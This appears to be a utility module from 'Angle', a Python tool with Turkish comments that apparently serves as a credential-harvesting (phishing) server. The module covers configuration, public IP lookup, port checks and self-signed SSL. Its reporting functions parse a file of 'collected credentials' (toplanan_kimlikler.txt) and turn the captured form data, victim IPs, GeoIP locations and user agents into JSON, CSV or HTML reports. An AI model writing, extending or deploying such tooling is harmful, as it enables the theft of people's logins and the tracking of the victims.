#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
temel yardımcı işlevler, ayar yönetimi ve doğrulama araçları.

konfigürasyon katmanı: varsayılan → dosya → ortam değişkeni → CLI argümanı
sırasıyla merge edilir.
"""

from __future__ import annotations

import ipaddress
import json
import os
import re
import socket
import ssl
import tempfile
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Optional

from .konsol import konsol


# ────────────────────────────── sabitler ──────────────────────────────

AYAR_DOSYASI = Path(__file__).parent / "ayarlar.json"
VERSIYON = "1.0.0"


# ────────────────────────────── konfigürasyon ──────────────────────────────

@dataclass
class Yapilandirma:
    """type-safe konfigürasyon veri sınıfı.

    Attributes:
        port: sunucu portu
        dinleyici_adresi: sunucunun dinleyeceği adres
        zaman_asimi: ağ işlemleri için varsayılan timeout (saniye)
        kullanici_ajani: HTTP isteklerinde kullanılacak User-Agent
        log_seviyesi: loglama seviyesi ("DEBUG", "INFO", "WARNING", "ERROR")
        log_dosyasi: opsiyonel log dosyası yolu
        kayit_dosyasi: toplanan kimlik bilgilerinin yazılacağı dosya
        sertifika_dosyasi: HTTPS için SSL sertifika dosyası
        anahtar_dosyasi: HTTPS için SSL anahtar dosyası
        https_aktif: HTTPS'nin etkin olup olmadığı
        rate_limit: IP başına dakikadaki maksimum istek sayısı
    """

    port: int = 8080
    dinleyici_adresi: str = "0.0.0.0"
    zaman_asimi: int = 10
    kullanici_ajani: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    log_seviyesi: str = "INFO"
    log_dosyasi: Optional[str] = None
    kayit_dosyasi: str = "toplanan_kimlikler.txt"
    sertifika_dosyasi: Optional[str] = None
    anahtar_dosyasi: Optional[str] = None
    https_aktif: bool = False
    rate_limit: int = 60

    def merge(self, diger: dict[str, Any]) -> "Yapilandirma":
        """verilen sözlükteki değerleri mevcut yapılandırma ile birleştirir.

        sadece tanımlı alanlar güncellenir, bilinmeyen anahtarlar yok sayılır.

        Args:
            diger: birleştirilecek anahtar-değer çiftleri

        Returns:
            güncellenmiş Yapilandirma nesnesi (kendisi)
        """
        for anahtar, deger in diger.items():
            if hasattr(self, anahtar) and deger is not None:
                setattr(self, anahtar, deger)
        return self

    def sozluk(self) -> dict[str, Any]:
        """yapılandırmayı sözlük olarak döndürür."""
        return asdict(self)


def yapilandirma_yukle(
    cli_argumanlari: Optional[dict[str, Any]] = None,
    dosya_yolu: Optional[Path] = None,
) -> Yapilandirma:
    """katmanlı konfigürasyon yükleme.

    merge sırası (son yazan kazanır):
        1. varsayılan değerler (dataclass)
        2. JSON dosyası
        3. ortam değişkenleri
        4. CLI argümanları

    Args:
        cli_argumanlari: komut satırından gelen parametreler
        dosya_yolu: konfigürasyon dosyası yolu (None ise varsayılan kullanılır)

    Returns:
        birleştirilmiş Yapilandirma nesnesi
    """
    yapilandirma = Yapilandirma()

    # 1. dosyadan yükle
    dosya = dosya_yolu or AYAR_DOSYASI
    if dosya.exists():
        try:
            with open(dosya, "r", encoding="utf-8") as f:
                dosya_verisi = json.load(f)
            yapilandirma.merge(dosya_verisi)
        except (json.JSONDecodeError, OSError) as e:
            konsol.uyari(f"ayar dosyası okunamadı: {e}")

    # 2. ortam değişkenlerinden yükle
    ortam_eslemesi = {
        "ANGLE_PORT": ("port", int),
        "ANGLE_HOST": ("dinleyici_adresi", str),
        "ANGLE_TIMEOUT": ("zaman_asimi", int),
        "ANGLE_LOG_LEVEL": ("log_seviyesi", str),
        "ANGLE_LOG_FILE": ("log_dosyasi", str),
        "ANGLE_RATE_LIMIT": ("rate_limit", int),
        "ANGLE_HTTPS": ("https_aktif", lambda v: v.lower() in ("1", "true", "evet")),
    }

    ortam_degerleri: dict[str, Any] = {}
    for ortam_adi, (alan_adi, donusturucu) in ortam_eslemesi.items():
        deger = os.environ.get(ortam_adi)
        if deger is not None:
            try:
                ortam_degerleri[alan_adi] = donusturucu(deger)
            except (ValueError, TypeError):
                konsol.uyari(f"ortam değişkeni '{ortam_adi}' geçersiz: {deger}")

    yapilandirma.merge(ortam_degerleri)

    # 3. CLI argümanlarından yükle
    if cli_argumanlari:
        yapilandirma.merge(cli_argumanlari)

    return yapilandirma


def ayar_kaydet(ayarlar: dict[str, Any], dosya_yolu: Optional[Path] = None) -> None:
    """ayarları JSON dosyasına yazar.

    Args:
        ayarlar: kaydedilecek ayar sözlüğü
        dosya_yolu: hedef dosya yolu (None ise varsayılan)
    """
    dosya = dosya_yolu or AYAR_DOSYASI
    try:
        with open(dosya, "w", encoding="utf-8") as f:
            json.dump(ayarlar, f, indent=4, ensure_ascii=False)
        konsol.basari(f"ayarlar kaydedildi: {dosya}")
    except OSError as e:
        konsol.hata(f"ayarlar kaydedilemedi: {e}")


# ────────────────────────────── ağ yardımcıları ──────────────────────────────

def yerel_ip_al() -> str:
    """sistemin yerel ağdaki IP adresini döndürür.

    UDP soketi ile 8.8.8.8'e bağlanma simülasyonu yaparak
    sistemin tercih ettiği IP'yi bulur.

    Returns:
        yerel IP adresi veya "127.0.0.1"
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2)
            s.connect(("8.8.8.8", 80))
            return str(s.getsockname()[0])
    except (OSError, socket.error):
        try:
            return socket.gethostbyname(socket.gethostname())
        except (OSError, socket.error):
            return "127.0.0.1"


def kamusal_ip_al() -> Optional[str]:
    """makinenin dış dünyadaki public (kamusal) IP adresini öğrenmeye çalışır.

    Returns:
        Public IP adresi veya başarısız olursa None
    """
    servisler = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com",
    ]
    import urllib.request
    for servis in servisler:
        try:
            req = urllib.request.Request(servis, headers={"User-Agent": "curl/7.68.0"})
            with urllib.request.urlopen(req, timeout=2.5) as res:
                ip = res.read().decode("utf-8").strip()
                if ip and ip_dogrula(ip):
                    return str(ip)
        except Exception:
            continue
    return None


def varsayilan_ip_al() -> str:
    """öncelikle kamuya açık (public) IP adresini, alınamazsa yerel (LAN) IP adresini döndürür."""
    pub_ip = kamusal_ip_al()
    if pub_ip:
        return pub_ip
    return yerel_ip_al()


def port_kontrol(port: int, adres: str = "0.0.0.0", zaman_asimi: float = 1.0) -> bool:
    """belirtilen portun kullanılabilir olup olmadığını denetler.

    Args:
        port: kontrol edilecek port numarası
        adres: kontrol adresi
        zaman_asimi: bağlantı zaman aşımı (saniye)

    Returns:
        True ise port boş (kullanılabilir)
    """
    if not (1 <= port <= 65535):
        konsol.hata(f"geçersiz port numarası: {port} (1-65535 aralığında olmalı)")
        return False

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(zaman_asimi)
            s.bind((adres, port))
            return True
    except OSError:
        return False


def port_sec_interaktif(varsayilan: int = 8080) -> int:
    """kullanıcıdan interaktif olarak port seçimi yapar.

    Args:
        varsayilan: varsayılan port numarası

    Returns:
        seçilen ve doğrulanmış port numarası
    """
    while True:
        port_str = konsol.girdi_al(f"port numarası", str(varsayilan))
        try:
            port = int(port_str)
            if not (1 <= port <= 65535):
                konsol.uyari("port 1-65535 aralığında olmalı.")
                continue
            if port_kontrol(port):
                return port
            konsol.uyari(f"{port} portu zaten kullanılıyor.")
        except ValueError:
            konsol.uyari("geçerli bir sayı girin.")


# ────────────────────────────── doğrulama araçları ──────────────────────────────

def ip_dogrula(ip_str: str) -> bool:
    """IP adresinin geçerli olup olmadığını kontrol eder.

    Args:
        ip_str: kontrol edilecek IP adresi metni

    Returns:
        True ise geçerli bir IPv4/IPv6 adresi
    """
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False


def eposta_dogrula(eposta: str) -> bool:
    """e-posta adresinin format olarak geçerli olup olmadığını kontrol eder.

    Args:
        eposta: kontrol edilecek e-posta adresi

    Returns:
        True ise geçerli format
    """
    desen = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
    return bool(re.match(desen, eposta))


def url_dogrula(url: str) -> str:
    """URL'nin geçerli formatta olduğundan emin olur.

    Eksikse https:// öneki ekler.

    Args:
        url: kontrol edilecek URL

    Returns:
        düzeltilmiş URL
    """
    url = url.strip()
    if not url:
        raise ValueError("URL boş olamaz.")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


# ────────────────────────────── SSL yardımcıları ──────────────────────────────

def ssl_baglami_olustur(
    sertifika: Optional[str] = None,
    anahtar: Optional[str] = None,
) -> Optional[ssl.SSLContext]:
    """HTTPS için SSL bağlamı oluşturur.

    Sertifika verilmezse self-signed sertifika üretir.

    Args:
        sertifika: sertifika dosyası yolu
        anahtar: özel anahtar dosyası yolu

    Returns:
        yapılandırılmış SSLContext veya None
    """
    if sertifika and anahtar:
        try:
            baglam = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            baglam.load_cert_chain(sertifika, anahtar)
            konsol.basari("SSL sertifikası yüklendi.")
            return baglam
        except (ssl.SSLError, FileNotFoundError) as e:
            konsol.hata(f"SSL sertifikası yüklenemedi: {e}")
            return None

    # self-signed sertifika üret
    try:
        import subprocess

        gecici_dizin = Path(tempfile.mkdtemp(prefix="angle_ssl_"))
        sertifika_yolu = gecici_dizin / "cert.pem"
        anahtar_yolu = gecici_dizin / "key.pem"

        subprocess.run(
            [
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", str(anahtar_yolu),
                "-out", str(sertifika_yolu),
                "-days", "365", "-nodes",
                "-subj", "/CN=angle-local",
            ],
            capture_output=True,
            check=True,
            timeout=10,
        )

        baglam = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        baglam.load_cert_chain(str(sertifika_yolu), str(anahtar_yolu))
        konsol.basari("self-signed SSL sertifikası üretildi.")
        return baglam
    except (FileNotFoundError, subprocess.CalledProcessError, OSError) as e:
        konsol.uyari(f"openssl bulunamadı veya sertifika üretilemedi: {e}")
        konsol.soluk("HTTPS devre dışı, HTTP ile devam ediliyor.")
        return None


# ────────────────────────────── dosya sistemi ──────────────────────────────

def guvenli_yol_birlestir(kok_dizin: str, istenen_yol: str) -> Optional[str]:
    """path traversal saldırılarını engelleyen güvenli dosya yolu birleştirme.

    Args:
        kok_dizin: güvenli kök dizin
        istenen_yol: istemcinin talep ettiği göreli yol

    Returns:
        güvenli tam yol veya None (traversal girişiminde)
    """
    kok = Path(kok_dizin).resolve()
    temiz_yol = str(istenen_yol).replace("\\", "/").lstrip("/")
    hedef = (kok / temiz_yol).resolve()

    try:
        if not hedef.is_relative_to(kok):
            konsol.uyari(f"path traversal girişimi engellendi: {istenen_yol}")
            return None
    except AttributeError:
        if str(hedef) != str(kok) and not str(hedef).startswith(str(kok) + os.sep):
            konsol.uyari(f"path traversal girişimi engellendi: {istenen_yol}")
            return None

    return str(hedef)


from functools import lru_cache


@lru_cache(maxsize=256)
def geoip_bilgisi_al(ip: str) -> dict[str, str]:
    """IP adresi için ülke, şehir ve ISP GeoIP sorgusu yapar (lru_cache ile önbelleklenir).

    Args:
        ip: sorgulanacak IPv4/IPv6 adresi

    Returns:
        {"ulke": ..., "sehir": ..., "isp": ...} sözlüğü
    """
    varsayilan = {"ulke": "Bilinmiyor", "sehir": "Bilinmiyor", "isp": "Bilinmiyor"}
    if not ip or ip in ("127.0.0.1", "localhost", "0.0.0.0") or ip.startswith(("192.168.", "10.", "172.16.")):
        return {"ulke": "Yerel Ağ (LAN)", "sehir": "Yerel", "isp": "Özel Ağ"}

    try:
        import urllib.request
        import json
        req = urllib.request.Request(
            f"http://ip-api.com/json/{ip}?fields=status,country,city,isp",
            headers={"User-Agent": "Mozilla/5.0"}
        )
        with urllib.request.urlopen(req, timeout=3) as res:
            veri = json.loads(res.read().decode("utf-8"))
            if veri.get("status") == "success":
                return {
                    "ulke": veri.get("country", "Bilinmiyor"),
                    "sehir": veri.get("city", "Bilinmiyor"),
                    "isp": veri.get("isp", "Bilinmiyor"),
                }
    except Exception:
        pass
    return varsayilan


# ────────────────────────────── raporlama ──────────────────────────────

def kayitlari_ayristir(log_dosyasi: str = "toplanan_kimlikler.txt") -> list[dict[str, Any]]:
    """toplanan kimlik bilgisi dosyasını okuyarak yapılandırılmış nesneler listesi döndürür.

    Args:
        log_dosyasi: kayıt dosyası yolu

    Returns:
        ayrıştırılmış kayıtlardan oluşan sözlük listesi
    """
    yol = Path(log_dosyasi)
    if not yol.exists():
        return []

    icerik = yol.read_text(encoding="utf-8", errors="replace")
    bloklar = icerik.split("============================================================")
    kayitlar: list[dict[str, Any]] = []

    for blok in bloklar:
        blok = blok.strip()
        if not blok:
            continue

        kayit: dict[str, Any] = {"zaman": "", "ip": "", "user_agent": "", "yol": "", "veri": "", "alanlar": {}}
        satirlar = blok.splitlines()
        veri_basladi = False
        veri_satirlari: list[str] = []

        for satir in satirlar:
            satir_s = satir.strip()
            if satir_s.startswith("────────────────────────────────────────────────────────────"):
                veri_basladi = True
                continue

            if not veri_basladi:
                if satir_s.startswith("[") and "IP:" in satir_s:
                    # [01-01-2026 12:00:00] IP: 192.168.1.1
                    parcalar = satir_s.split(" IP: ")
                    kayit["zaman"] = parcalar[0].strip("[]")
                    if len(parcalar) > 1:
                        kayit["ip"] = parcalar[1].strip()
                elif satir_s.startswith("User-Agent:"):
                    kayit["user_agent"] = satir_s[11:].strip()
                elif satir_s.startswith("Yol:"):
                    kayit["yol"] = satir_s[4:].strip()
            else:
                veri_satirlari.append(satir)

        veri_metni = "\n".join(veri_satirlari).strip()
        kayit["veri"] = veri_metni

        # form-urlencoded veya JSON parse etmeye çalış
        alanlar: dict[str, str] = {}
        if veri_metni.startswith("{") and veri_metni.endswith("}"):
            try:
                json_veri = json.loads(veri_metni)
                if isinstance(json_veri, dict):
                    alanlar = {str(k): str(v) for k, v in json_veri.items()}
            except Exception:
                pass
        if not alanlar and "=" in veri_metni:
            from urllib.parse import parse_qs
            parsed = parse_qs(veri_metni)
            for k, v in parsed.items():
                alanlar[k] = ", ".join(v)

        kayit["alanlar"] = alanlar
        if kayit["ip"] or kayit["veri"]:
            kayitlar.append(kayit)

    return kayitlar


def rapor_olustur(
    log_dosyasi: str = "toplanan_kimlikler.txt",
    cikti_dosyasi: str = "rapor.json",
    format_turu: str = "json",
) -> bool:
    """toplanan verilerden rapor dosyası üretir (json, csv veya html).

    Args:
        log_dosyasi: girdi log dosyası
        cikti_dosyasi: üretilecek rapor dosyası yolu
        format_turu: "json", "csv" veya "html"

    Returns:
        başarılı ise True
    """
    kayitlar = kayitlari_ayristir(log_dosyasi)
    if not kayitlar:
        konsol.uyari("raporlanacak kimlik kaydı bulunamadı.")
        return False

    format_turu = format_turu.lower()
    cikti_yolu = Path(cikti_dosyasi)

    try:
        if format_turu == "json":
            cikti_yolu.write_text(json.dumps(kayitlar, indent=4, ensure_ascii=False), encoding="utf-8")
        elif format_turu == "csv":
            import csv
            with open(cikti_yolu, "w", newline="", encoding="utf-8") as f:
                yazici = csv.writer(f)
                yazici.writerow(["Zaman", "IP", "Yol", "User-Agent", "Veri", "Ayrıştırılmış Alanlar"])
                for k in kayitlar:
                    yazici.writerow([
                        k["zaman"], k["ip"], k["yol"], k["user_agent"],
                        k["veri"], json.dumps(k["alanlar"], ensure_ascii=False)
                    ])
        elif format_turu == "html":
            satirlar = []
            for k in kayitlar:
                alanlar_html = "".join(f"<li><b>{html_ka(str(ak))}:</b> {html_ka(str(av))}</li>" for ak, av in k["alanlar"].items())
                satirlar.append(f"""
                <tr style="border-bottom:1px solid #444;">
                    <td style="padding:8px;">{html_ka(k['zaman'])}</td>
                    <td style="padding:8px;color:#00ffcc;">{html_ka(k['ip'])}</td>
                    <td style="padding:8px;">{html_ka(k['yol'])}</td>
                    <td style="padding:8px;"><ul>{alanlar_html or html_ka(k['veri'])}</ul></td>
                </tr>
                """)
            html_icerik = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Angle — Kimlik Raporu</title></head>
<body style="background:#111;color:#eee;font-family:sans-serif;padding:20px;">
    <h2>Angle — Kimlik Bilgisi Raporu</h2>
    <p>Toplam Kayıt: {len(kayitlar)} | Tarih: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}</p>
    <table style="width:100%;border-collapse:collapse;background:#222;">
        <thead>
            <tr style="background:#333;color:#00ffcc;text-align:left;">
                <th style="padding:10px;">Zaman</th><th style="padding:10px;">IP</th><th style="padding:10px;">Yol</th><th style="padding:10px;">Detay</th>
            </tr>
        </thead>
        <tbody>{"".join(satirlar)}</tbody>
    </table>
</body>
</html>"""
            cikti_yolu.write_text(html_icerik, encoding="utf-8")
        else:
            konsol.hata(f"desteklenmeyen rapor formatı: {format_turu}")
            return False

        konsol.basari(f"rapor oluşturuldu: {cikti_yolu} ({format_turu.upper()})")
        return True
    except Exception as e:
        konsol.hata(f"rapor oluşturulamadı: {e}")
        return False


def html_ka(metin: str) -> str:
    """basit HTML kaçış karakteri dönüştürücü."""
    return metin.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")